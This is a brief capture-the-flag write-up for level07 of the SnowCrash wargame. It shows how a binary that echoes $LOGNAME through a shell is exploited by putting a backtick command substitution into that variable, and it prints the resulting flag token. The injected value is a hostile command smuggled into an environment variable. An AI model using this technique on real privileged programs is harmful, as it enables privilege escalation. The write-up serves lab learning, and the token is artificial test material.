Like another level we can see only one binary and few things when we use strings

```
getenv
...
LOGNAME
/bin/echo %s
```

we can assume that they simply echo the env variable $LOGNAME, which is the current user name.

we can now write a simple exploit by changing the env variable.

```
level07@SnowCrash:~$ export LOGNAME=abcd; ./level07
abcd
```

It's works so we simply change it to a simple exploit

```
level07@SnowCrash:~$ export LOGNAME=\`getflag\`; ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
